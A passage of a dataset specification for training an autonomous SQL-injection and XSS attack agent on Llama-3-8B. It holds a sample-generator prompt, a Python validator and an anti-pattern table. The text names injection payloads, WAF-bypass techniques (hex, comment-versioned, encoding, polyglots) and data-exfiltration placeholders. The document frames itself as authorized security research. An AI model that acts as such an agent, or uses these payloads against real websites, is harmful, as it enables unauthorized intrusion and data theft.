      "rationale": "<≤25 words>",
      "mutation_class": "<RETRY_MUTATED only>",
      "signal": "<ANALYZE_RESPONSE only>",
      "next_recommended": "<ANALYZE_RESPONSE only>",
      "success_state": "<STOP only>",
      "evidence": "<STOP only>"
    }
  },
  "_meta": {
    "expected_observation": "<HTTP response pattern>",
    "validation_signal": "<redirect_302 | sleep_5s | reflection_present | error_500 | dom_mutation | jwt_in_cookie | n/a>",
    "sink_class": "<from taxonomy>",
    "payload_tier": <1-4>,
    "is_advanced": <true|false>,
    "eval_target": "<juice_shop | dvwa | generic>",
    "is_hard_negative": <true|false>,
    "is_multi_turn": <true|false>,
    "flow_id": "<UUID or null>",
    "turn_index": "<integer or null>",
    "backend": "<inferred>"
  }
}

THOUGHT QUALITY (per action):
- SQL_INJECT / XSS_INJECT: name specific sink (element + attribute + name), cite backend signal,
  state injection context, justify payload class
- RETRY_MUTATED: cite prior failure mode (filter / block / no-reflection / column-mismatch) and the
  specific mutation that addresses it
- ANALYZE_RESPONSE: classify the response signal and recommend next action
- STOP: cite specific success indicator (cookie/header/body/status) and which success-state class
  it satisfies
- WAIT (hard): name the specific defense observed
- WAIT (easy): enumerate absent sinks
- CRAWL_DEEPER: name highest-priority next URL and how it serves the goal
- Forbidden phrases (auto-fail): "this might", "this could", "appears to", "may be vulnerable",
  "let me", "i think", "possibly", "seems to"

PAYLOAD QUALITY (INJECT / RETRY):
- Context-appropriate: attribute → quote-breakout, script-string → string-termination, etc.
- Tier 2+ preferred over Tier 1 basics
- Tier-4 advanced (hex/polyglot/encoding-bypass) ONLY when SAMPLE_TYPE specifies; Tier-4 is capped
  at ~22% of payload-emitting samples (Llama-3-8B calibration to avoid overfitting)
- Within Tier-4 samples: prefer REALISTIC context-specific bypasses (case mutation, comment-
  versioned, hex substitution, column-count fix, `||` swap, encoding-bypass) over RESEARCHY
  mega-polyglots (Brute Logic, multi-DBMS stacked, quote-context-agnostic). Mega-polyglots are
  reserved for unknown-context fallback and capped per-polyglot at ~5 samples
- Each advanced sample's Thought must JUSTIFY why this specific advanced technique vs. a simpler
  Tier-2/3 payload would have worked
- Preserve CSRF tokens when present in HTML
- Use {{EXFIL}} for XSS exfil URLs OR DOM-only payloads (alert(1), document.title=...)

STOP DISCIPLINE:
- Only fire STOP when prior-turn Observation contains a defined success indicator from §3.5
- Never fire STOP on bare HTTP 200, payload reflection alone, or 4xx/5xx
- Evidence field must quote the specific bytes that prove success

NEGATIVE SAMPLES:
- Easy WAIT: enumerate absent sinks specifically
- Hard WAIT: name the specific defense (server-side type validation per HTTP 400/422,
  parameterized query evidence, CSP nonce, escaped reflection, sanitizer present)
- CRAWL_DEEPER: name highest-priority next URL and why
```

### USER PROMPT (parametrize and call N times)

```
Generate a SENTINEL-AGENT v3 training sample with these constraints:

SAMPLE_TYPE: {SAMPLE_TYPE}
  // SQL_AUTH_BYPASS | SQL_UNION | SQL_BLIND_BOOL | SQL_BLIND_TIME | SQL_ADVANCED_HEX |
  // SQL_ADVANCED_POLYGLOT | XSS_HTML | XSS_ATTRIBUTE | XSS_SCRIPT | XSS_STORED |
  // XSS_ADVANCED_POLYGLOT | XSS_ADVANCED_ENCODING | RETRY_MUTATED | ANALYZE_RESPONSE |
  // STOP_AUTH | STOP_DATA_EXFIL | STOP_JWT | STOP_ADMIN_PANEL | WAIT_EASY | WAIT_HARD |
  // CRAWL_NAV

BACKEND: {BACKEND}
  // PHP_MYSQL | ASPNET_MSSQL | JAVA_POSTGRES | NODE_UNKNOWN | NODE_SQLITE | ANGULAR_SPA | WORDPRESS

PAGE_CONTEXT: {login | search | profile_edit | checkout | admin_panel | product_listing |
              comment_form | registration | password_reset | settings}

EVAL_TARGET: {generic | juice_shop | dvwa}

CSRF_PRESENT: {true | false}
FIELD_NAMING: {snake_case | camelCase | hyphen-case | aspnet_ctl}
WAF_SIGNAL: {none | blocked_keyword | blocked_quote | rate_limited | type_validation_403 |
            reflected_but_encoded | column_count_mismatch}
IS_MULTI_TURN: {true | false}
FLOW_ID: {<UUID if part of an end-to-end flow, else null>}
TURN_INDEX: {<integer if multi-turn, else null>}

RECENT_FORBIDDEN_PATTERNS:
{<state summary from generator harness — see R18 — listing recent fingerprints, goals, payloads,
  triples, and Thought 6-grams that this sample MUST NOT replicate>}

Per-sample constraints:
1. HTML snippet: 6-15 lines, structurally plausible for {PAGE_CONTEXT}; follow {EVAL_TARGET} DOM
   conventions; for ANALYZE_RESPONSE / STOP samples, html_snippet MAY be empty string when full
   context is in prior_turns
2. Thought: per R3 requirement for the action type
3. If SAMPLE_TYPE contains "ADVANCED": payload MUST be Tier 4 (polyglot, hex, comment-versioned,
   CHAR/CHR, double-encoded). Sample is rejected if Tier <4
4. If WAF_SIGNAL ≠ none: include WAF response as HTML comment in snippet OR as prior-turn
   Observation; payload must adapt to bypass
5. If IS_MULTI_TURN: prior_turns[N-1] must be a realistic prior turn with Observation populated;
   current turn output uses prior_turns to drive its decision
6. If SAMPLE_TYPE starts with "STOP_": prior_turns[N-1] must contain Observation with the success
   indicator from §3.5 corresponding to the STOP class; evidence field quotes the proof bytes
7. _meta fields all populated; payload_tier accurate; is_advanced=true iff Tier 4; flow_id and
   turn_index consistent with IS_MULTI_TURN
8. MUST NOT replicate any pattern listed in RECENT_FORBIDDEN_PATTERNS

Output the full sample (input + output + _meta) as one JSON object. No other text.
```

---

## 8. Programmatic Validation (Python)

Replace v1's manual checklist with code. Run against every generator output before adding to dataset. State is shared across the generation run for deduplication checks.

```python
import re, json, hashlib
from collections import Counter

FORBIDDEN = ['this might', 'this could', 'appears to', 'may be vulnerable',
             'let me', 'i think', 'possibly', 'seems to']

BACKENDS = ['php', 'mysql', 'aspx', 'mssql', 'asp.net', '__viewstate', 'postgres',
            'jsp', 'java', 'oracle', 'node', 'angular', 'spa', 'sqlite', 'mongo',
            'dvwa', 'juice', 'wordpress', 'coldfusion', 'cfm', 'struts']

CONTEXTS = ['attribute', 'script', 'html', 'url', 'json', 'template',
            'sql-numeric', 'sql-string', 'numeric context', 'string context',
            'innerhtml', 'domsanitizer']

ACTIONS = {'SQL_INJECT', 'XSS_INJECT', 'RETRY_MUTATED', 'ANALYZE_RESPONSE',
           'CRAWL_DEEPER', 'WAIT', 'STOP'}

PAYLOAD_ACTIONS = {'SQL_INJECT', 'XSS_INJECT', 'RETRY_MUTATED'}
TERMINAL_ACTIONS = {'STOP', 'ANALYZE_RESPONSE', 'WAIT'}

REQUIRED_OUTPUT_KEYS = {'Thought', 'Action', 'Action_Input'}
REQUIRED_INPUT_BASE_KEYS = {'target_url', 'method', 'parameters', 'headers', 'rationale'}

VALID_METHODS = {'GET', 'POST', 'n/a'}
VALID_MUTATION_CLASSES = {'encoding_bypass', 'comment_injection', 'hex_substitution',
                          'polyglot_swap', 'case_mutation', 'char_concatenation',
                          'double_encoding', 'unicode_escape', 'column_count_fix'}
VALID_SIGNALS = {'fail_filtered', 'fail_blocked', 'fail_no_reflection',
                 'fail_column_mismatch', 'partial_success', 'success_authenticated',
                 'success_data_leaked', 'ambiguous'}
VALID_SUCCESS_STATES = {'authenticated_dashboard', 'jwt_issued', 'admin_panel_accessed',
                        'data_exfiltrated', 'session_established', 'privilege_escalated'}


class DatasetState:
    def __init__(self):
        self.html_hashes = Counter()
        self.goal_canonical = Counter()
        self.payload_strings = Counter()
        self.spb_triples = Counter()
        self.turn1_payloads = Counter()
        self.hidden_field_sets = Counter()
        self.thought_6grams = Counter()


def normalize_html(html: str) -> str:
    h = re.sub(r'<!--.*?-->', '', html, flags=re.DOTALL)
    h = re.sub(r'\s+', ' ', h).strip()
    h = re.sub(r'(\w+)="[^"]*"', r'\1=""', h)
    h = re.sub(r"(\w+)='[^']*'", r"\1=''", h)
    return h


def html_structural_hash(html: str) -> str:
    return hashlib.sha1(normalize_html(html).encode()).hexdigest()[:16]


def canonical_goal(goal: str) -> str:
    g = re.sub(r'[^a-z0-9 ]', '', goal.lower()).strip()
    g = re.sub(r'\s+', ' ', g)
    return g


def six_grams(text: str):
    words = text.lower().split()
    return [' '.join(words[i:i+6]) for i in range(len(words) - 5)]


def validate(sample, state: DatasetState) -> tuple[bool, str]:
    out = sample.get('output', {})
    inp = sample.get('input', {})
    meta = sample.get('_meta', {})

    # V01 schema completeness
    if set(out.keys()) != REQUIRED_OUTPUT_KEYS:
        return False, 'V01: output keys mismatch'
    if not REQUIRED_INPUT_BASE_KEYS.issubset(out['Action_Input'].keys()):
        return False, 'V01: Action_Input missing required base keys'

    action = out['Action']

    # V02 action enum + method enum
    if action not in ACTIONS:
        return False, 'V02: invalid action'
    if out['Action_Input']['method'] not in VALID_METHODS:
        return False, 'V02: invalid method'

    # V03 thought constraints
    thought = out['Thought']
    # Smart sentence splitter: period+whitespace+capital letter (avoids splitting on /login.php)
    sentence_parts = re.split(r'(?<=[.!?])\s+(?=[A-Z])', thought.strip())
    sentence_count = len([s for s in sentence_parts if s.strip()])
    if sentence_count > 4:
        return False, f'V03: thought >4 sentences ({sentence_count})'
    if len(thought.split()) > 80:
        return False, 'V03: thought >80 words'
    tlow = thought.lower()
    if any(f in tlow for f in FORBIDDEN):
        return False, 'V03: forbidden phrase'

    # V04 backend + context for INJECT / RETRY
    if action in {'SQL_INJECT', 'XSS_INJECT', 'RETRY_MUTATED'}:
        if not any(b in tlow for b in BACKENDS):
            return False, 'V04: no backend signal in thought'
        if action != 'RETRY_MUTATED' and not any(c in tlow for c in CONTEXTS):
            return False, 'V04: no context cite in thought'

    # V05 sink alignment
    if action in PAYLOAD_ACTIONS:
        params = out['Action_Input']['parameters']
        if not params:
            return False, 'V05: payload action with empty parameters'
        rationale = out['Action_Input'].get('rationale', '').lower()
        haystack = tlow + ' ' + rationale
        if not any(name.lower() in haystack for name in params.keys()):
            return False, 'V05: thought/rationale does not name target parameter'

    # V06 CSRF preservation
    html = inp.get('html_snippet', '')
    csrf_match = re.search(
        r'name=["\'](_csrf|_token|csrf|csrf_token|authenticity_token|nonce|__RequestVerificationToken)["\']\s+value=["\']([^"\']+)["\']',
        html
    )
    if csrf_match and action in PAYLOAD_ACTIONS:
        token_name = csrf_match.group(1)
        if token_name not in out['Action_Input']['parameters']:
            return False, f'V06: CSRF token {token_name} not preserved'

    # V07 negative thought quality
    if action in {'WAIT', 'CRAWL_DEEPER'}:
        if len(thought.split()) < 15:
            return False, 'V07: negative thought too short'
        if action == 'WAIT' and meta.get('is_hard_negative'):
            defense_signals = ['parameterized', 'type validation', 'csp', 'nonce',
                               'escaped', 'sanitiz', 'pattern', 'server-side',
                               '422', '400', 'rejected', 'domsanitizer', 'dompurify']
            if not any(d in tlow for d in defense_signals):
                return False, 'V07: hard negative thought lacks defense citation'

    # V08 metadata realism
    obs = meta.get('expected_observation', '')
    if not obs or obs in {'response here', 'placeholder', ''}:
        return False, 'V08: expected_observation is placeholder'

    # V09 advanced flag truthfulness
    if meta.get('is_advanced'):
        payload_str = json.dumps(out['Action_Input'].get('parameters', {}))
        advanced_markers = ['/*!', '0x', 'CHAR(', 'CHR(', 'HEX(', '\\u00', '%25',
                            'jaVasCript:', 'oNloAd', '/**/', '&#x', 'CONVERT(int',
                            'cross join sys.objects', '||', '`;alert', 'srcdoc']
        if not any(m in payload_str for m in advanced_markers):
            return False, 'V09: is_advanced=true but no advanced markers in payload'

    # V10 action-specific Action_Input fields
    ai = out['Action_Input']
    if action == 'RETRY_MUTATED':
        mc = ai.get('mutation_class')
        if mc not in VALID_MUTATION_CLASSES:
            return False, 'V10: RETRY_MUTATED missing/invalid mutation_class'
        if not inp.get('prior_turns'):
            return False, 'V10: RETRY_MUTATED requires prior_turns'

    if action == 'ANALYZE_RESPONSE':
        if ai.get('signal') not in VALID_SIGNALS:
            return False, 'V10: ANALYZE_RESPONSE missing/invalid signal'
        if ai.get('next_recommended') not in ACTIONS:
            return False, 'V10: ANALYZE_RESPONSE missing/invalid next_recommended'

    if action == 'STOP':
        if ai.get('success_state') not in VALID_SUCCESS_STATES:
            return False, 'V10: STOP missing/invalid success_state'
        if not ai.get('evidence') or len(ai.get('evidence', '')) < 30:
            return False, 'V10: STOP requires substantive evidence (>=30 chars)'
        if not inp.get('prior_turns'):
            return False, 'V10: STOP requires prior_turns with success observation'

    # V11 rationale length
    if len(ai.get('rationale', '').split()) > 25:
        return False, 'V11: rationale >25 words'

    # ---- Anti-duplication checks (R16) ----

    # V12 HTML structural uniqueness
    if html.strip():
        h_hash = html_structural_hash(html)
        if state.html_hashes[h_hash] >= 2:
            return False, f'V12: HTML structural hash {h_hash} already used 2x'

    # V13 canonical goal frequency
    g_canon = canonical_goal(inp.get('goal', ''))
    if state.goal_canonical[g_canon] >= 8:
        return False, f'V13: goal "{g_canon}" used 8x'

    # V14 exact-payload uniqueness (for payload-emitting actions)
    if action in PAYLOAD_ACTIONS:
        payload_str = json.dumps(out['Action_Input']['parameters'], sort_keys=True)
        if state.payload_strings[payload_str] >= 1:
            return False, 'V14: identical payload string already used'

    # V15 sink-payload-backend triple
    triple = (meta.get('sink_class', 'unk'),
              meta.get('payload_tier', 0),
              meta.get('backend', 'unk'))
    if state.spb_triples[triple] >= 4:
        return False, f'V15: triple {triple} already used 4x'

    # V16 multi-turn turn-1 uniqueness
    if inp.get('prior_turns'):
        t1 = inp['prior_turns'][0]
        t1_payload = json.dumps(t1.get('Action_Input', {}).get('parameters', {}), sort_keys=True)
        if state.turn1_payloads[t1_payload] >= 2:
            return False, 'V16: turn-1 payload already used 2x'

    # V17 hidden field set
    hidden = sorted(re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)', html))
    if hidden:
        h_set = '|'.join(hidden)
        if state.hidden_field_sets[h_set] >= 5:
            return False, f'V17: hidden field set [{h_set}] used 5x'

    # V18 thought 6-gram overlap
    grams = six_grams(thought)
    if grams:
        max_overlap = max((state.thought_6grams[g] for g in grams), default=0)
        if max_overlap >= 4:
            return False, 'V18: thought reuses 6-gram >=4x across dataset'

    # ---- All checks passed; commit to state ----
    if html.strip():
        state.html_hashes[h_hash] += 1
    state.goal_canonical[g_canon] += 1
    if action in PAYLOAD_ACTIONS:
        state.payload_strings[payload_str] += 1
    state.spb_triples[triple] += 1
    if inp.get('prior_turns'):
        state.turn1_payloads[t1_payload] += 1
    if hidden:
        state.hidden_field_sets[h_set] += 1
    for g in grams:
        state.thought_6grams[g] += 1

    return True, 'ok'
```

Run on every generator output. Track rejection rates per rule; tune the generator prompt if any single rule rejects >10% of output.

---

## 9. Anti-Patterns (auto-reject)

| Anti-pattern | Why fatal | Fix |
|---|---|---|
| Generic Thought ("this form may be vulnerable") | Teaches hedging | Always: element + attribute + backend + context + payload-class |
| Payload reused without context match | Teaches memorization not reasoning | Rationale must derive payload from sink |
| WAIT with empty/generic Thought | Teaches lazy negation | Enumerate absent sinks (easy) or cite specific defense (hard) |
| `Observation_Template` in model output | Teaches observation hallucination | Move to `_meta` only |
| All SQLi using `' OR 1=1--` | Single-payload overfit | Rotate all 4 tiers; advanced ≥ 30% of payload-emitting |
| All XSS using `<script>alert(1)</script>` | Cannot handle filtering | Include attribute breakout, JS context, polyglots, encoding bypasses |
| Repeating identical HTML structure with renamed fields | Memorizes structure | Vary form method, action, surrounding DOM, hidden fields per §6 |
| `attacker.com` hardcoded in exfil | Won't validate against local target | Use `{{EXFIL}}` placeholder OR DOM-only payload |
| Single-turn-only dataset | Teaches static decisions | ≥15% multi-turn end-to-end flows with full loop coverage |
| STOP fired on bare HTTP 200 | Teaches premature stop | STOP requires §3.5 success indicator with cited evidence |
| RETRY_MUTATED that isn't actually mutated | Teaches no-op retries | Mutation must be observably different at byte level + named class |
| ANALYZE_RESPONSE without signal classification | Teaches vague interpretation | signal field + next_recommended both required |
| Multi-turn turn-N referencing prior turns without using them | Teaches independent turns | Thought must explicitly cite prior observation/decision |
| Mega-polyglot (Brute Logic / multi-DBMS) used as default Tier-4 | 7-8B will memorize the polyglot shape and emit it everywhere | Reserve mega-polyglots for unknown-context fallback (≤5 samples each); use realistic context-specific bypasses for bulk of Tier-4 |
| Tier-4 density >25% on a 7-8B with 400 samples | Overfits flashy payloads, hurts generalization on real Juice Shop/DVWA targets | Cap Tier-4 at 20-25% of payload-emitting; favor adaptation depth over payload extremity |
| STOP samples <10% of dataset | Agent over-attacks past success, loops forever, never declares completion | Maintain ≥12% STOP samples; cover all 6 success-state classes from §3.5 |
| ANALYZE_RESPONSE <6% of dataset | Agent can't classify failure modes, can't choose right mutation | Maintain ≥8% ANALYZE_RESPONSE; cover all 8 signal classes |
| Ambiguous-response samples <20% of ANALYZE_RESPONSE | Agent over-confidently classifies noisy real-world responses as success/fail, fabricates non-existent signals | Maintain ≥25% of ANALYZE_RESPONSE samples with `signal=ambiguous` (same-length, partial reflection, generic 200, CSP-uncertain) |
| CRAWL_DEEPER <3% of dataset | Agent can't autonomously reach sinks; stalls on landing pages | Maintain ≥4% CRAWL samples covering link prioritization, auth-form discovery, admin-path recognition |

---

**SENTINEL-AGENT Dataset Specification v3.2** — Llama-3-8B calibrated, completion-weighted. For Authorized Security Research & AI Training Only.
